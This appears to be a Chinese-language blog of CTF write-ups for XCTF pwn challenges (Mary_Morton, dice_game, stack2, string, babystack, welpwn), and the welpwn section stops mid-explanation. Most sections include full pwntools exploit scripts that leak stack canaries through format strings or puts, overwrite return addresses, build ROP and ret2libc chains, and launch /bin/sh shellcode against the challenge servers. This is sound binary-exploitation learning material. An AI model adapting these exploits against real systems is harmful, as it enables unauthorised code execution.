<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-mary_morton-格式化字符串泄露canary"><a class="markdownIt-Anchor" href="#攻防世界-pwn-mary_morton-格式化字符串泄露canary"></a> 攻防世界 pwn-Mary_Morton-格式化字符串泄露canary</h1>
<ol>
<li>先查看程序，发现没有开启地址随机化</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103823331.png" alt="image-20210413103823331"></p>
<ol start="2">
<li>进行调试，发现程序让你会让你选择漏洞</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103844363.png" alt="image-20210413103844363"></p>
<ol start="3">
<li>用ida打开程序，发现在选择格式化字符串（2）的时候会调用一个printf函数，存在格式化字符串漏洞</li>
</ol>
<p>主函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103904120.png" alt="image-20210413103904120"></p>
<p>函数sub_4008EB</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103919834.png" alt="image-20210413103919834"></p>
<p>由于程序开启了canary保护，所以得先通过格式化字符串泄露出canary的值，才能覆盖返回地址达到开启后门函数的目的。</p>
<p>查看栈空间，发现canary的值距离buf的位置是0x90-0x8=0x88，该程序是64位程序，一个格式化字符串占8字节，0x88/8=17，再通过格式化字符串判断偏移量</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103935012.png" alt="image-20210413103935012"></p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103953632.png" alt="image-20210413103953632"></p>
<p>4.测试字符串的偏移，输入aaaa %p %p %p %p %p %p %p %p %p</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104113264.png" alt="image-20210413104113264"></p>
<p>根据回显可以知道偏移为6所以buf到var_8偏移为17+6=23</p>
<p>5.观察其他函数，发现有一个后门函数可以得到flag，地址为0x4008DA</p>
<p>​     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104124884.png" alt="image-20210413104124884"></p>
<p>6.思路为先通过格式化字符串得到canary的值，然后再通过栈溢出去执行后门函数，得到flag，所以编写payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;Mary_Morton&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io=process(&#x27;./Mary_Morton&#x27;)</span><br>io = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">45232</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;3. Exit the battle \n&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>catflag=<span class="hljs-number">0x4008DA</span>        <span class="hljs-comment">#后门函数的地址</span><br>payload = <span class="hljs-string">&quot;%23$p&quot;</span>       <span class="hljs-comment">#buf距离canary值的偏移为23</span><br>io.sendline(payload)<br>Canary=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)   <span class="hljs-comment">#得到canary的值</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(catflag)<br>io.send(payload)<br><span class="hljs-built_in">print</span> io.recvall()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-dice_game"><a class="markdownIt-Anchor" href="#攻防世界-pwn-dice_game"></a> 攻防世界 pwn-dice_game</h1>
<p>1.先检查程序有没有存在栈溢出</p>
<p>​        <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104229973.png" alt="image-20210413104229973"></p>
<p>发现不存在canary保护，可能进行栈溢出的操作。</p>
<p>2.使用ida进行分析</p>
<p>主函数：</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104245282.png" alt="image-20210413104245282"></p>
<p>sub_A20()函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104308863.png" alt="image-20210413104308863"></p>
<p>经过分析可知，该程序的目的是对比输入的数字与随机生成的种子seed[]生成的随机数对6求余再加1进行对比，如果正确50次则通过。</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104331604.png" alt="image-20210413104331604"></p>
<p>通过查看地址可以知道当输入名字buf时，可以通过偏移覆盖到seed，偏移量为0x40</p>
<p>注：关于rand()和srand()随机函数:这两个函数生成的随机数实际上是一段数字的循环，这些数字取决于随机种子。在调用rand（）函数时，必须先利用srand()设好的随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</p>
<p>所以只要控制随机数生成的种子seed，就可以预测生成的随机数，需要利用题目提供的库libc.so.6</p>
<p>Payload脚本</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413104657091.png" alt="image-20210413104657091"></p>
<h1 id="攻防世界-pwn-stack2"><a class="markdownIt-Anchor" href="#攻防世界-pwn-stack2"></a> 攻防世界 pwn-stack2</h1>
<p>1.先检查程序的保护</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105116926.png" alt="image-20210413105116926"></p>
<p>发现程序没有开启地址随机化，但是开启了canary保护</p>
<p>2.用ida观察函数，发现其中存在数组越界导致的栈溢出。</p>
 <img src="\12.png" alt="12" style="zoom:67%;">
<p>其中v5,v7都是我们可输入的数值，但是在赋值给数组时没有检查数组越界而导致了栈溢出</p>
<p>3.使用gdb进行动态调试，在存在该漏洞的函数下设置断点。</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105310409.png" alt="image-20210413105310409" style="zoom:67%;">
<p>设置断点为0x8048839观察函数的偏移量。</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105330148.png" alt="image-20210413105330148" style="zoom:67%;">
<p>函数的返回地址为0xf7e1d637</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105439298.png" alt="image-20210413105439298" style="zoom:67%;"> 
<p>查看当我们更改已经数组里的数字时的栈空间</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105513866.png" alt="image-20210413105513866" style="zoom:67%;">
<p>经过检验和计算得到的偏移量为0x84</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/11.png" alt="11"></p>
<p>4.用ida查看发现存在后门函数hackhere，地址为0x0804859B</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105759309.png" alt="image-20210413105759309" style="zoom:67%;">
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105829019.png" alt="image-20210413105829019" style="zoom:67%;">
<p>5．先写出payload脚本将函数的返回地址覆盖为hackhere的函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">58555</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><span class="hljs-comment">##def writedword()</span><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x9b</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位，依次写入hackhere的地址</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x85</span>)<br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<p>运行之后发现hackhere函数提供的参数并不能拿到sh</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110309852.png" alt="image-20210413110309852"></p>
<p>此时只能构造ROP链将system函数的参数修改为/sh</p>
<p>首先查询system的plt表地址</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110412418.png" alt="image-20210413110412418" style="zoom:67%;">
<p>可以看到system的plt表地址为0x08048450</p>
<p>然后查询参数sh的地址</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110506599.png" alt="image-20210413110506599" style="zoom: 80%;">
<p>参数sh的地址为0x08048987</p>
<p>修改payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>sh = <span class="hljs-number">0x08048987</span><br>system =<span class="hljs-number">0x08048450</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">59553</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x50</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x84</span>)       <span class="hljs-comment">#先写入system的plt表地址</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>leave_offset+=<span class="hljs-number">8</span>                        <span class="hljs-comment">#跳过ebp</span><br>writebyte(leave_offset,<span class="hljs-number">0x87</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x89</span>)       <span class="hljs-comment">#写入参数sh</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-string-格式化字符串"><a class="markdownIt-Anchor" href="#攻防世界-pwn-string-格式化字符串"></a> 攻防世界-pwn-string-格式化字符串</h1>
<p>1.首先检查程序保护，发现保护除了PIE都开启了</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113058130.png" alt="image-20210413113058130" style="zoom:67%;">                               
<p>2.用ida打开并分析函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113119231.png" alt="image-20210413113119231" style="zoom:67%;">
<p>主函数首先会打印出v4存储的值以及v4+4然后执行sub_400D72(v4)</p>
<p>下面是sub_400D72(v4)</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113159566.png" alt="image-20210413113159566" style="zoom:67%;">
<p>先执行的是sub_400A7D()下图是sub_400A7D()，只能知道当显示So, where you will go?:时我们得输入east才能继续执行下去</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113242197.png" alt="image-20210413113242197" style="zoom:67%;">
<p>再继续观察，发现sub_400CA6(a1)这个函数里有这样一段，如果a1数组的第一个数等于第二个数，那么可以执行外部命令（查找发现这个函数是可以执行shellcode的），传过来的a1数组就是开始的v3数组</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113307543.png" alt="image-20210413113307543" style="zoom:67%;">
<p>然后在sub_400BB9()存在一处格式化字符串漏洞，由之前主函数可以知道v3的第一个数是68，v3[1]是85，要用格式化字符串漏洞让这两个数相等</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113331447.png" alt="image-20210413113331447" style="zoom:67%;">
<p>在And, you wish is:输入1，Your wish is输入aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x查看输出，可以知道之前输入的1在第七个位置是格式化字符串的第七个参数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113404697.png" alt="image-20210413113404697" style="zoom:67%;">
<p>由于之前输出的secret[0]就是v3第一个数的地址，所以只要用格式化字符串漏洞修改其为85即可，然后输入shellcode（可以使用pwn库的函数自动生成）</p>
<p>所以可以构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;48916&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;secret[0] is &#x27;</span>)<br>v3_addr=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>) <span class="hljs-comment">#接收v3的地址</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(v3_addr)) <span class="hljs-comment">#第一次发送v3的地址</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">85</span>+<span class="hljs-string">&#x27;%7$n&#x27;</span>   <span class="hljs-comment">#偏移为7，将v3的地址的位置的参数改为85</span><br>p.recvuntil(<span class="hljs-string">&#x27;And, you wish is:/n&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;I will help you! USE YOU SPELL\n&#x27;</span>)<br>p.sendline(asm(shellcraft.amd64.linux.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))  <span class="hljs-comment">#发送调用/bin/sh的sellcode</span><br>p.interactive()	<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"></a> 攻防世界-pwn-pwn1-构造rop链泄露put的真实地址</h1>
<ol>
<li>先检查文件属性</li>
</ol>
<p>​    <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113958358.png" alt="image-20210413113958358" style="zoom:67%;"></p>
<p>该程序是64位程序，发现保护已经开的很全了</p>
<p>2.用ida观察主函数，发现有个read函数和puts函数可以进行栈溢出</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114030279.png" alt="image-20210413114030279" style="zoom:67%;">
<p>3.观察栈结构，字符串s距离canary的值的偏移为0x90-0x8=0x88</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114130145.png" alt="image-20210413114130145"></p>
<p>所以可以通过put函数将canary显示出来，由于put函数遇到\00会停止输出，调试可以知道，当我们输入a*0x88后再输入回车时，回车的\0A会覆盖掉canary末尾的\00这时就可以输出canary</p>
<p>输入a*0x88不输入\n时的内存数据</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114203956.png" alt="image-20210413114203956" style="zoom:67%;">
<p>Canary的值应该是0x7c5ddb9e9a8a7d00，但是继续运行程序选择“2“调用put函数时不输出canary的值。</p>
<p>输入’0x88’*a+’\n’的内存空间</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114238047.png" alt="image-20210413114238047" style="zoom:67%;">
<p>这时可以正常输出canary的值了，但是末尾的\00会变成\0a，所以接受时要把末尾的\0a修改为\00</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114309571.png" alt="image-20210413114309571"></p>
<p>4.题目给了一个动态链接库，所以我们可以在里面寻找到execve(&quot;/bin/sh&quot;)的地址</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114328650.png" alt="image-20210413114328650" style="zoom:67%;">
<p>随便选择一个0x45216，此题开启了地址随机化，如果想要通过栈溢出运行execve(&quot;/bin/sh&quot;)，就得泄露内存中的基址</p>
<p>5.利用put()函数泄露put()的真实地址，由于是64位程序，首先找到一个pop_rdi,查找可知地址为0x400a93</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114404796.png" alt="image-20210413114404796" style="zoom:67%;">
<p>64位程序泄露put()真实地址的方式为：p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)，泄露之后就可以使用</p>
<p>由此可以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br> <br>elf = ELF(<span class="hljs-string">&quot;./babystack&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41209&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./babystack&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>execve = <span class="hljs-number">0x45216</span><br>main_addr = <span class="hljs-number">0x400908</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的got表地址</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的plt表地址</span><br>pop_rdi = <span class="hljs-number">0x0400a93</span><br> <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload)                  <span class="hljs-comment">#先输入0x88个a使put()能够泄露出canary的值</span><br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)<br> <br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))   <span class="hljs-comment">#因为末尾的\n会覆盖末尾的\00</span><br> <br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.send(payload1)             <span class="hljs-comment">#泄露出put()的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>puts_addr=u64(p.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#读取到\x00停止</span><br><br>execve_addr = puts_addr - (libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] - execve)   <span class="hljs-comment">#使用相对偏移来计算execve的真实地址</span><br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> +  p64(execve_addr)  <span class="hljs-comment">#覆盖返回值为execve的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload2)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"><a class="markdownIt-Anchor" href="#攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"></a> 攻防世界-pwn-welpwn-泄露write函数地址构建rop链接</h1>
<p>1.先检查程序，只开启了nx</p>
  <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115205088.png" alt="image-20210413115205088" style="zoom:67%;">                
<p>2.用ida打开程序进行分析，主函数如下</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115228251.png" alt="image-20210413115228251" style="zoom:67%;">
<p>主函数会调用一个叫echo的函数，把输入buf传入，echo函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115252303.png" alt="image-20210413115252303" style="zoom:67%;">
<p>此函数把传入的字符串依次复制给局部变量s2，直到0停止，注意到这里s2只有16个长度，可能会存在溢出，但是因为这里遇到\00会停止循环，不能直接构造rop链</p>
<p>通过调试，输入24个A的内存空间如下</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115320597.png" alt="image-20210413115320597" style="zoom:67%;">
<p>这两个栈是连续的，可以看成是这样的结构</p>
<p>0x10  s2  A * 16      0x38 buf  A * 8</p>
<p>0x18  s2  A*8       0x40 返回地址？</p>
<p>0x28    返回地址</p>
<p>0x30 buf  A*16</p>
<p>思路：首先我们输入的地址里不能存在\00，否则就不能读入到s2，因为栈是连续的，如果想要执行我们构造的rop链，就得跳过前面输入的0x18个长度的数据，可以寻找一个存在4个pop指令的地址，如下图0x40089c的位置就有4个连续的pop指令</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214630486.png" alt="image-20210413214630486"></p>
<p>这样我们可以构造这样的栈空间,就可以执行我们需要的函数了</p>
<p>0x10  s2  A*16      0x38 buf  A*8</p>
<p>0x18  s2  A*8       0x40 pop_4</p>
<p>0x28    pop_4      0x48 pop_rdi</p>
<p>0x30 buf  A*16      0x50 got</p>
<p>此题我们开始没有给出libc的版本，所以我们先泄露write的地址，先找到一个pop_rdi的地址为0x4008a3</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115639822.png" alt="image-20210413115639822" style="zoom:67%;">
<p>先写出一个泄露write地址的脚本，便于判断libc版本</p>
